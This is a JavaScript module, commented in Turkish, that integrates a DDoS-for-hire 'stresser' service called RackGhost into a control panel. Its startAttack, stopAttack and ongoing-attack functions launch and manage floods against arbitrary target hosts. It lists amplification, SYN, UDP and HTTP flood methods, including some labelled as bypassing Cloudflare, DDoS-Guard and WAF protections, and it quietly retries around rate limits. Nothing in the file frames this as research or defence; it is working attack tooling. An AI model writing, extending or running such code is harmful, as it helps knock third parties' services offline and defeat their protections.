/**
 * rackghost.js
 * RackGhost stresser entegrasyonu (stresse.st alternatifi provider).
 *
 * TEK hesapta IKI stresser sistemi (ayni oturum servisi uzerinden):
 *  - 'main' (api:2, /panel/stresser.php klasik): serbest host/port/time/
 *    concurrents/method; maks 15 slot, 7200sn. Carpanli methodlar (HTTPSMIX
 *    2x) tuketim uzerinden dogrulanir.
 *  - 'new'  (api:3, /panel/assign.php "New Stresser"): atanmis profil ile
 *    {action:'start_assigned', profile_id, params:{host,time,method,
 *    reqmethod,rps,conn}}; maks 80 baglanti (yonetici uyarisi: 40-50 ustu
 *    sormadan gitme), stop HEDEF adina yapilir, ongoing sunucu tarafli.
 *
 * Hesap geneli 1 istek/sn rate limit: iki stresser ayni paylasimli throttle
 * kuyrugundan gecer. Watchdog oturum servisini (127.0.0.1:3210) izler.
 */

const axios = require('axios');
const { sendTelegram } = require('./telegram');

const SERVICE_URL = 'http://127.0.0.1:3210';
const SERVICE_TOKEN = process.env.LOKI_RG_LOCAL_TOKEN || '';
const WATCHDOG_INTERVAL_MS = 5 * 60 * 1000;
// Yeni stresser'in atanmis profil ID'si (assign sayfasindaki s-assign degeri)
const RG_PROFILE_ID = process.env.LOKI_RG_PROFILE_ID || '7';

// ---- Klasik stresser (api:2) methodlari -----------------------------------
const METHODS_MAIN = [
  { value: 'SOUNDV3', label: '[BETA] SOUND-V3 (HTTPS/HTTP3) [CF]', layer: 'L7' },
  { value: 'SPAMMERV3', label: '[BETA] SPAMMER v3 (HTTP/1.x HTTP/2) [CDN]', layer: 'L7' },
  { value: 'HTTPSMIX', label: '[BETA] HTTPS-MIX', layer: 'L7' },
  { value: 'SOCKETV5', label: '[BETA] SOCKET V5 (HTTP/1.1 HTTPS)', layer: 'L7' },
  { value: 'WEBSOCKETV2', label: '[BETA] WEBSOCKET v2 (WS/WSS)', layer: 'L7' },
  { value: 'SOUNDV2', label: 'SOUND-V2 (HTTP/HTTPS/HTTP2) [CF]', layer: 'L7' },
  { value: 'HTTPSCRYPTO', label: 'HTTPS-CRYPTO v2 (HTTPS2)', layer: 'L7' },
  { value: 'HTTPSFLOOD', label: 'HTTPS REQUEST-CUSTOM (HTTP/HTTP2)', layer: 'L7' },
  { value: 'HTTPSCUSTOM', label: 'HTTPS-CUSTOM v2 (Browser) [ENT]', layer: 'L7' },
  { value: 'SOCKETV4', label: 'SOCKET V4 (HTTP/1.1)', layer: 'L7' },
  { value: 'SPAMMERV2', label: 'SPAMMER v2 (HTTPS/1.1)', layer: 'L7' },
  { value: 'WEBSOCKET-CUSTOM', label: 'WEBSOCKET-CUSTOM (WS/WSS)', layer: 'L7' },
  { value: 'TOR', label: 'TOR (.onion)', layer: 'L7' },
  { value: 'DNS', label: 'DNS Amplification', layer: 'L4' },
  { value: 'NTP', label: 'NTP Amplification', layer: 'L4' },
  { value: 'TCPSYNRST', label: 'TCP SYN RST', layer: 'L4' },
  { value: 'TCPACK', label: 'TCP ACK', layer: 'L4' },
  { value: 'TCPBYPASS', label: 'TCP Bypass', layer: 'L4' },
  { value: 'TCPBYPASS2', label: 'TCP Bypass v2', layer: 'L4' },
  { value: 'TCPGAME', label: 'TCP Game', layer: 'L4' },
  { value: 'TCPSSH', label: 'TCP SSH', layer: 'L4' },
  { value: 'TCPSYN', label: 'TCP SYN', layer: 'L4' },
  { value: 'TCPSYNACK', label: 'TCP SYNACK', layer: 'L4' },
  { value: 'UDPABUSE', label: 'UDP Abuse', layer: 'L4' },
  { value: 'UDPGAMESERVER', label: 'UDP Game Server', layer: 'L4' },
  { value: 'ICMP', label: 'ICMP', layer: 'L4' },
  { value: 'UDPCUSTOM', label: 'UDP Custom', layer: 'L4' },
  { value: 'TCPCUSTOM', label: 'TCP Custom', layer: 'L4' },
  { value: 'TCPAMP', label: 'TCP Enterprise', layer: 'L4' },
  { value: 'UDPMIX', label: 'UDP Mix', layer: 'L4' },
  { value: 'UDPTCPMIX', label: 'UDP+TCP Mix', layer: 'L4' }
];

// ---- Yeni stresser (api:3, assign) methodlari ------------------------------
// SERVIS DISI olanlar etiketle nir: upstream secmeye izin verir ama kullaniciyi uyarir.
const METHODS_NEW = [
  { value: 'Http-flood', label: 'Http-flood — Ücretsiz HTTP/2 Flooder', layer: 'L7' },
  { value: 'Human', label: 'Human — Yeni UAM Bypass [PRIVATE]', layer: 'L7' },
  { value: 'Percussed', label: '❌ PERCUSSED (SERVİS DIŞI)', layer: 'L7' },
  { value: 'G-Flood', label: '❌ G-FLOOD (SERVİS DIŞI)', layer: 'L7' },
  { value: 'Hitting', label: '❌ HITTING (SERVİS DIŞI)', layer: 'L7' },
  { value: 'Cache', label: '❌ CACHE (SERVİS DIŞI)', layer: 'L7' },
  { value: 'Secure', label: 'Secure — Çeşitli korumaları aşar', layer: 'L7' },
  { value: 'Flooder', label: 'Flooder — Standart HTTP/2 Flooder', layer: 'L7' },
  { value: 'Browser', label: 'Browser — Cloudflare Challenge ve DDoS-Guard aşar', layer: 'L7' },
  { value: 'HTTP-STORM', label: 'HTTP-STORM — Özel korumalar / Cloudflare WAF', layer: 'L7' },
  { value: 'HTTP2-FLOODER', label: 'HTTP2-FLOODER', layer: 'L7' },
  { value: 'HTTP1-FLOODER', label: 'HTTP1-FLOODER', layer: 'L7' },
  { value: 'HTTP-MEDUSA', label: 'HTTP-MEDUSA — Özel korumalar', layer: 'L7' },
  { value: 'HTTP-AREX', label: 'HTTP-AREX — CF/DDoS-Guard bypass', layer: 'L7' }
  // NOT: upstream select'inde etiketsiz 'GET'/'POST' secenekleri de vardi;
  // kendi panelinin method kartlarinda yer almazlar (miras kalan bos girdiler).
  // Istek tipi zaten ayri rgReqmethod (GET/POST) parametresi olarak gider.
];

const STRESSERS = {
  main: { name: 'main', label: 'Klasik', api: 2, limits: { maxTime: 7200, maxConcurrents: 15 }, methods: METHODS_MAIN },
  new: { name: 'new', label: 'Yeni (Profil)', api: 3, limits: { maxTime: 7200, maxConcurrents: 80 }, methods: METHODS_NEW }
};

// Bazi methodlar girilen concurrents'in kati kadar slot tuketir (or. HTTPSMIX,
// HTTPCUSTOM 2x). Kullanicinin girdigi deger upstream'e AYNEN gonderilir;
// limit ve gosterim tuketim (girilen x carpan) uzerinden hesaplanir.
const METHOD_MULTIPLIERS = { HTTPSMIX: 2, HTTPSCUSTOM: 2 };

function slotMultiplier(method) {
  return METHOD_MULTIPLIERS[String(method).toUpperCase()] || 1;
}

function getStresser(name) {
  if (name && STRESSERS[name]) return STRESSERS[name];
  return null;
}

function getStressers() {
  return Object.values(STRESSERS).map((s) => ({
    name: s.name, label: s.label, limits: s.limits, profileId: s.name === 'new' ? RG_PROFILE_ID : null
  }));
}

// Gorunum/display onek: main 'rg_' (geriye uyumlu), new 'rg2_'
function displayPrefix(stresser) {
  return stresser === 'new' ? 'rg2_' : 'rg_';
}

function normalizeRgError(msg) {
  const m = String(msg || '');
  if (/reached the limit of available slots/i.test(m)) {
    return 'RackGhost slot limiti doldu; bir saldırıyı durdurup tekrar deneyin.';
  }
  if (/wait 1 second/i.test(m)) {
    return 'RackGhost hız sınırı; birkaç saniye sonra kendiliğinden düzelir.';
  }
  return m;
}

// Hesap geneli 1 istek/sn throttle (iki stresser ayni kuyruk). Slot ANINDA
// rezerve edilir; ayni milisaniyede gelen istekler birlikte cikip kurali ihlal
// etmesin diye zaman damgasi burada ilerletilir.
let lastApiCallAt = 0;
async function throttle() {
  const now = Date.now();
  const at = Math.max(now, lastApiCallAt + 1100);
  lastApiCallAt = at;
  const wait = at - now;
  if (wait > 0) await new Promise((r) => setTimeout(r, wait));
}

let lastOkAt = null;
let lastError = null;

async function apiCall(payload) {
  try {
    await throttle();
    const res = await axios.post(`${SERVICE_URL}/api`, payload, { timeout: 120000, headers: { 'x-rg-token': SERVICE_TOKEN } });
    const data = res.data;
    if (!data || !data.ok) {
      const err = new Error((data && data.error) || 'servis hatasi');
      if (data && data.retry) err.retryable = true;
      throw err;
    }
    lastOkAt = new Date().toISOString();
    lastError = null;
    return data.data;
  } catch (err) {
    if (err.code === 'ECONNREFUSED') {
      const e = new Error('rackghost oturum servisi kapali (127.0.0.1:3210)');
      e.serviceDown = true;
      throw e;
    }
    if (err.response && err.response.data && err.response.data.error) {
      throw new Error(err.response.data.error);
    }
    throw err;
  }
}

/**
 * Saldiri baslat. opts.stresser: 'main' | 'new' (yoksa 'main').
 *  main params: {host, port, time, concurrents, method}
 *  new  params: {host, time, method, reqmethod, rps, concurrents->conn}
 * Donus: { message, attackIds, raw, slotsTotal, account: stresserAdi }
 */
async function startAttack(params, opts = {}) {
  const st = getStresser(opts.stresser) || STRESSERS.main;
  const method = String(params.method || '');
  const wanted = Math.max(1, parseInt(params.concurrents) || 1);

  let payload;
  if (st.name === 'new') {
    // Yeni stresser: atanmis profil + form parametreleri. conn = concurrents.
    if (wanted > st.limits.maxConcurrents) {
      throw new Error(`RackGhost (Yeni): en fazla ${st.limits.maxConcurrents} bağlantı girebilirsiniz (yönetici uyarısı: 40-50 üzeri için izin alın).`);
    }
    payload = {
      action: 'start_assigned',
      api: 3,
      profile_id: RG_PROFILE_ID,
      params: {
        host: params.host,
        time: parseInt(params.time),
        method,
        reqmethod: String(params.reqmethod || 'GET').toUpperCase() === 'POST' ? 'POST' : 'GET',
        rps: Math.max(1, parseInt(params.rps) || 64),
        conn: wanted
      }
    };
  } else {
    const upper = method.toUpperCase();
    const mult = slotMultiplier(upper);
    if (wanted * mult > st.limits.maxConcurrents) {
      throw new Error(mult > 1
        ? `RackGhost (Klasik): bu method ${mult}x slot tüketir; en fazla ${Math.floor(st.limits.maxConcurrents / mult)} girebilirsiniz.`
        : `RackGhost (Klasik): en fazla ${st.limits.maxConcurrents} concurrent girebilirsiniz.`);
    }
    payload = {
      action: 'start',
      api: 2,
      params: {
        host: params.host,
        port: parseInt(params.port),
        time: parseInt(params.time),
        concurrents: wanted,
        method: upper
      }
    };
  }

  // Rate limit gecici bir durumdur; turu tamamen kaybetmek yerine birkac
  // saniye icinde yeniden dene (kullanici bunu hissetmemeli).
  let data = null;
  let lastErr = null;
  for (let attempt = 1; attempt <= 4; attempt += 1) {
    try {
      data = await apiCall(payload);
      if (data && (data.success || (data.data && data.data.status === 'true'))) break;
      lastErr = new Error(normalizeRgError(data?.message || data?.data?.message || data?.error || 'RackGhost saldiri baslatamadi'));
      data = null;
    } catch (err) {
      lastErr = new Error(normalizeRgError(err.message));
    }
    const isRateLimit = /hız sınırı|wait 1 second|rate/i.test(lastErr.message);
    if (!isRateLimit || attempt === 4) break;
    await new Promise((r) => setTimeout(r, 2500 * attempt));
  }
  if (!data) {
    throw lastErr || new Error('RackGhost saldiri baslatamadi');
  }

  if (st.name === 'new') {
    // Yanit: {status:'true', message, target, method, duration}. Kimlik = hedef
    // (stop hedefe yapilir). Kayit defterinde rg2_<target> olarak gorunur.
    const d = data.data || {};
    const target = String(d.target || params.host);
    const duration = parseInt(d.duration) || parseInt(params.time) || 60;
    return {
      message: d.message || data.message || 'başlatıldı',
      attackIds: [target],
      raw: [{ id: target, host: target, method: d.method || method, time: duration, slots: wanted }],
      slotsTotal: wanted,
      account: 'new'
    };
  }

  const items = Array.isArray(data.data) ? data.data : (data.data ? [data.data] : []);
  const sendConc = wanted;
  const reportedSlots = items.reduce((sum, it) => sum + (parseInt(it.slots, 10) || 1), 0);
  const slotsTotal = Math.max(reportedSlots, sendConc * slotMultiplier(method.toUpperCase()));
  return { message: data.message, attackIds: items.map((it) => String(it.id)), raw: items, slotsTotal, account: 'main' };
}

/**
 * Saldiri durdur.
 *  main: id (upstream saldiri ID) + host
 *  new : id = HEDEF adi (assign sistemi hedefle durdurur)
 */
async function stopAttack(id, host, stresser) {
  const st = getStresser(stresser);
  return apiCall({ action: 'stop', api: st ? st.api : 2, id: String(id), host });
}

// Ongoing cache: stresser bazli 8sn (ayni veriyi tuketiciler tekrar istemesin)
const ongoingCaches = { main: { at: 0, data: null }, new: { at: 0, data: null } };

async function getOngoingFor(stresserName) {
  const st = getStresser(stresserName) || STRESSERS.main;
  const cache = ongoingCaches[st.name];
  if (cache.data && Date.now() - cache.at < 8000) return cache.data;
  const data = await apiCall({ action: 'ongoing', api: st.api });
  const list = data && Array.isArray(data.data) ? data.data : [];
  cache.at = Date.now();
  cache.data = list;
  return list;
}

/** Iki stresserin aktif saldirilari birlesik; her satira .stresser etiketi.
 *  new satirlari alan uyumu: id|test_id, host|target|ip, time|duration. */
async function getOngoing() {
  const results = await Promise.allSettled([getOngoingFor('main'), getOngoingFor('new')]);
  const merged = [];
  results.forEach((r, i) => {
    const name = i === 0 ? 'main' : 'new';
    if (r.status !== 'fulfilled') return; // tek stresser hataliysa digeri akar
    r.value.forEach((row) => {
      const norm = {
        ...row,
        id: row.id ?? row.test_id ?? row.target ?? row.host,
        host: row.host ?? row.target ?? row.ip,
        time: row.time ?? row.duration
      };
      merged.push({ ...norm, stresser: name });
    });
  });
  return merged;
}

function getMethods(stresser) {
  const st = getStresser(stresser);
  return st ? st.methods : METHODS_MAIN;
}

function isConfigured() {
  return true;
}

function getStatus() {
  return {
    configured: true,
    stressers: getStressers(),
    limits: STRESSERS.new.limits,
    lastOkAt,
    lastError
  };
}

// ---- Watchdog --------------------------------------------------------------
let serviceAlerted = false;
let watchdogTimer = null;
let consecutiveUnhealthy = 0;
const UNHEALTHY_ALERT_THRESHOLD = 3;

async function watchdogTick() {
  let healthy = false;
  let detail = '';
  try {
    const res = await axios.get(`${SERVICE_URL}/health`, { timeout: 10000, headers: { 'x-rg-token': SERVICE_TOKEN } });
    const h = res.data || {};
    healthy = Boolean(h.ok);
    detail = h.ok ? '' : (h.detail || `servis: ${h.state}`);
  } catch (err) {
    detail = 'oturum servisi kapali';
  }
  if (healthy) {
    consecutiveUnhealthy = 0;
    serviceAlerted = false;
    return;
  }
  consecutiveUnhealthy += 1;
  lastError = detail;
  if (consecutiveUnhealthy < UNHEALTHY_ALERT_THRESHOLD) return;
  if (!serviceAlerted) {
    serviceAlerted = true;
    sendTelegram(
      `⚠️ <b>RackGhost oturum servisi sorunlu</b>\n` +
      `Durum: ${detail || 'bilinmiyor'} (${consecutiveUnhealthy} ardışık kontrol)\n` +
      `CapSolver bakiyesi ve servis loglari kontrol edilmeli.`
    ).catch(() => {});
  }
}

function initRackghost() {
  if (watchdogTimer) clearInterval(watchdogTimer);
  watchdogTimer = setInterval(() => {
    watchdogTick().catch((err) => console.warn('[rackghost] watchdog:', err.message));
  }, WATCHDOG_INTERVAL_MS);
  watchdogTick().catch(() => {});
  console.log(`[rackghost] init: 2 stresser — main(api2, maks ${STRESSERS.main.limits.maxConcurrents} slot) + new(api3, profil ${RG_PROFILE_ID}, maks ${STRESSERS.new.limits.maxConcurrents} baglanti)`);
}

// Stop/launch sonrasi cache bayatligini onle.
function invalidateOngoingCache() {
  Object.values(ongoingCaches).forEach((c) => { c.at = 0; });
}

module.exports = {
  initRackghost,
  startAttack,
  stopAttack,
  getOngoing,
  getMethods,
  getStatus,
  isConfigured,
  slotMultiplier,
  invalidateOngoingCache,
  getStressers,
  displayPrefix,
  RG_PROFILE_ID,
  LIMITS: { maxTime: 7200, maxConcurrents: 80 }
};
